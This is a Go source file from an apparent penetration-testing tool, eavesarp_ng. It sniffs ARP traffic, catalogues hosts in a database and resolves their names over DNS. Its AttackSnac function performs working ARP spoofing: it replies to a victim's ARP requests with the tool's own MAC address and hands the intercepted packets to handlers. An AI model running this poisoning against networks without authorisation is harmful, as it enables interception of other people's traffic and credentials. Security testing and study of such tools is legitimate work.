package eavesarp_ng

import (
	"context"
	"errors"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"go.uber.org/zap"
	"net"
	"sync"
)

var (
	NoTransportLayerErr = errors.New("no transport layer found")
)

// MainSniff starts the ARP and DNS background routines and sniffs network traffic
// from the interface until ctx is done or an error occurs.
//
// - iName is the name of the network interface to sniff on.
// - iAddr (optionally empty) specifies the ipv4 address
//    on the interface to sniff for.
// - When attackCh receives an AttackSnacCfg, a new background routine
//   to perform an ARP spoofing attack is started.
func MainSniff(ctx context.Context, cfg Cfg, attackCh chan AttackSnacCfg) (err error) {
	// SOURCE: https://github.com/google/gopacket/blob/master/examples/arpscan/arpscan.go

	arpSleeper := NewSleeper(1, 5, 30)
	dnsSleeper := NewSleeper(1, 5, 30)

	ch := make(chan error) // channel to receive notification of routine death

	// create child contexts for each subroutine
	sniffCtx, sniffCancel := context.WithCancel(ctx)

	go func() {

		died := make(chan error)  // to listen for routine death
		errCh := make(chan error) // child routines send errors over this
		wg := sync.WaitGroup{}    // to watch for completion of 4 md5 child routines
		wg.Add(4)

		go func() { // watch for child routine death/errors
			// NOTE: only the first error is retained

			var err error
		outer:
			for {
				select {
				case <-sniffCtx.Done():
					break outer
				case iErr := <-died:
					if iErr != nil && err == nil {
						// retain first error
						err = iErr
					}
					// call all Cancel functions
					sniffCancel()
				}
			}
			errCh <- err
		}()

		go func() { // start routine to manage sender, sniff, and attack routines

			for {
				select {

				case <-sniffCtx.Done(): // parent sniff routine has been canceled
					wg.Done()
					return
				case args := <-attackCh: // receive spoof attack configurations

					fields := []zap.Field{zap.String("senderIp", args.SenderIp.String()),
						zap.String("targetIp", args.TargetIp.String())}

					cfg.log.Info("poisoning conversation", fields...)

					go func() { // start the attack in a new routine
						fields := fields[:]

						ctx, cancel := context.WithCancel(args.Ctx)
						go func() {
							err := AttackSnac(ctx, cfg, args.SenderIp, args.TargetIp, args.Handlers...)
							if err != nil { // error while performing attack
								fields = append(fields, zap.Error(err))
								cfg.log.Error("error while poisoning conversation", fields...)
								died <- err
							} else {
								cfg.log.Info("done poisoning", fields...)
							}
						}()

						select { // wait for the sniff job to finish
						case <-sniffCtx.Done(): // parent sniff routine has been canceled
							cancel()
						case <-args.Ctx.Done(): // caller has canceled the attack
							cancel()
						}

					}()
				}
			}

		}()

		cfg.log.Info("starting arp sender routine")
		go func() { // arp sender routine
			died <- SenderServer(sniffCtx, cfg, arpSleeper, cfg.arpSenderC, SendArp)
			wg.Done()
		}()

		cfg.log.Info("starting dns sender routine")
		go func() { // dns sender routine
			died <- SenderServer(sniffCtx, cfg, dnsSleeper, cfg.dnsSenderC, ResolveDns)
			wg.Done()
		}()

		cfg.log.Info("starting arp sniffer routine")
		go func() { // main sniffer routine
			died <- WatchArp(sniffCtx, cfg)
			wg.Done()
		}()

		wg.Wait()
		// close channels
		close(died)
		err := <-errCh // block until an error or nil is received
		ch <- err      // notify main routine

	}()

	err = <-ch // wait for completion and receive error
	close(ch)

	return
}

// WatchArp monitors ARP requests and initiates DNS name
// resolution for newly discovered IP addresses.
func WatchArp(ctx context.Context, cfg Cfg) (err error) {

	//============================
	// PERPETUALLY CAPTURE PACKETS
	//============================

	// handle for reading
	rHandle, err := pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		cfg.log.Error("error opening packet capture", zap.Error(err))
		return err
	}
	defer rHandle.Close()

	// handle for writing
	var wHandle *pcap.Handle
	wHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		cfg.log.Error("error opening packet capture", zap.Error(err))
		return err
	}
	defer wHandle.Close()

	if err = rHandle.SetBPFFilter("arp"); err != nil {
		cfg.log.Error("failed to set bpf filter", zap.Error(err))
		return err
	}

	src := gopacket.NewPacketSource(rHandle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		var packet gopacket.Packet
		select {
		case <-ctx.Done():
			cfg.log.Info("killing arp watch routine")
			return
		case packet = <-in:
			go handleWatchArpPacket(cfg, wHandle, packet)
		}
	}
}

func (u arpStringAddrs) getOrCreateSenderDbValues(cfg Cfg, arpMethod DiscMethod) (senderMac *Mac, senderIp *Ip, err error) {

	//===========
	// HANDLE SRC
	//===========

	// MAC
	senderMacBuff, err := GetOrCreateMac(cfg.db, u.SenHw, arpMethod)
	if err != nil {
		cfg.log.Error("failed to create mac", zap.String("mac", u.SenHw), zap.Error(err))
		return
	}
	senderMac = &senderMacBuff

	// IP
	senderIpBuff, err := GetOrCreateIp(cfg.db, u.SenIp, &senderMacBuff.Id, arpMethod, true, false)
	if err != nil {
		cfg.log.Error("failed to create ip", zap.String("ip", u.SenIp), zap.Error(err))
		return
	} else if senderIpBuff.MacId == nil {

		//============
		// SET SRC MAC
		//============
		// - the mac is unavailable when a _target_ IP address was discovered via ARP request
		// - since goc doesn't update records, we'll need to update it manually

		if _, err = cfg.db.Exec(`UPDATE ip SET mac_id=? WHERE id=?`, senderMac.Id, senderIpBuff.Id); err != nil {
			cfg.log.Error("failed to associate ip with mac address", zap.String("mac", u.SenHw), zap.Error(err))
			return
		}
		senderIpBuff.MacId = &senderMac.Id
		cfg.log.Info("found new sender", zap.String("senderMac", u.SenHw), zap.String("senderIp", senderIpBuff.Value))
	}
	senderIp = &senderIpBuff

	return
}

func (u arpStringAddrs) getOrCreateSnifferDbValues(cfg Cfg, arpMethod DiscMethod) (senMac *Mac, senIp *Ip,
  tarIp *Ip, err error) {

	if senMac, senIp, err = u.getOrCreateSenderDbValues(cfg, arpMethod); err != nil {
		return
	}
	if senIp != nil && senIp.IsNew {
		cfg.log.Info("passively discovered new arp sender",
			zap.String("senderIp", u.SenIp),
			zap.String("senderMac", u.SenHw))
	}

	if arpMethod == PassiveArpMeth {
		var tarIpBuff Ip
		tarIpBuff, err = GetOrCreateIp(cfg.db, u.TarIp, nil, arpMethod, false, false)
		if err != nil {
			cfg.log.Error("failed to create arp mac", zap.String("mac", u.TarHw), zap.Error(err))
			return
		}
		tarIp = &tarIpBuff
		if tarIp != nil && tarIp.IsNew {
			cfg.log.Info("passively discovered new arp target", zap.String("targetIp", u.TarIp))
		}
	}

	return
}

// GetPacketTransportLayerInfo extracts the transport layer protocol and port from
// a packet.
//
// An error is returned if an unknown transport layer is found. When this occurs,
// proto and dstPort are zero values.
//
// Known protocols transport layer protocols: `tcp`, `udp`, `sctp`
func GetPacketTransportLayerInfo(packet gopacket.Packet) (proto string, dstPort int, err error) {
	transLayer := packet.TransportLayer()
	if transLayer == nil {
		err = NoTransportLayerErr
		return
	}
	switch lT := transLayer.LayerType(); lT {
	case layers.LayerTypeTCP:
		layer := transLayer.(*layers.TCP)
		proto = "tcp"
		dstPort = int(layer.DstPort)
	case layers.LayerTypeUDP:
		layer := transLayer.(*layers.UDP)
		proto = "udp"
		dstPort = int(layer.DstPort)
	case layers.LayerTypeSCTP:
		layer := transLayer.(*layers.SCTP)
		proto = "sctp"
		dstPort = int(layer.DstPort)
	default:
		err = errors.New("unknown transport layer type captured")
	}
	return
}

// GetArpLayer extracts the ARP layer from packet, returning nil when no
// ARP layer is found.
func GetArpLayer(packet gopacket.Packet) *layers.ARP {
	if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
		return arpLayer.(*layers.ARP)
	}
	return nil
}

func attackSnacBpf(sIp, tIp string) string {
	return fmt.Sprintf("src host %s || dst host %s", sIp, tIp)
}

// AttackSnac poisons the sender's ARP table by sending our MAC address
// when a request for the target's IP is observed. After poisoning
// occurs and non-ARP traffic is detected, each packet is passed to
// a series of handler functions.
//
// NOTE: Before poisoning the sender's ARP table, this function passively
// waits for the sender to broadcast an ARP request.
func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP,
  handlers ...ArpSpoofHandler) (err error) {

	logFields := []zap.Field{zap.String("senderIp", senIp.String()), zap.String("targetIp", tarIp.String())}
	var rHandle, wHandle *pcap.Handle
	if rHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever); err != nil {
		logFields = append(logFields, zap.Error(err))
		cfg.log.Error("failed to start packet capture to attack snac", logFields...)
		return
	}
	defer rHandle.Close()

	// filter to capture both sides of the conversation
	if err = rHandle.SetBPFFilter(attackSnacBpf(senIp.String(), tarIp.String())); err != nil {
		logFields = append(logFields, zap.Error(err))
		cfg.log.Error("failed to set bpf filter to attack snac", logFields...)
		return
	}

	if wHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever); err != nil {
		logFields = append(logFields, zap.Error(err))
		cfg.log.Error("failed to start packet capture while attacking snac", logFields...)
		return
	}
	defer wHandle.Close()

	src := gopacket.NewPacketSource(rHandle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		select {
		case <-ctx.Done():
			return
		case packet := <-in:

			if arp := GetArpLayer(packet); arp != nil && arp.Operation == layers.ARPRequest {
				cfg.log.Debug("poisoning sender arp table", logFields...)
				// Respond with our MAC
				cfg.arpSenderC <- SendArpCfg{
					Handle:    wHandle,
					Operation: layers.ARPReply,
					SenderHw:  cfg.iface.HardwareAddr,
					SenderIp:  tarIp,
					TargetHw:  arp.SourceHwAddress,
					TargetIp:  arp.SourceProtAddress,
				}
				continue
			}

			// Run handlers
			go func() {
				for _, h := range handlers {
					if h != nil {
						h(packet)
					}
				}
			}()
		}
	}
}
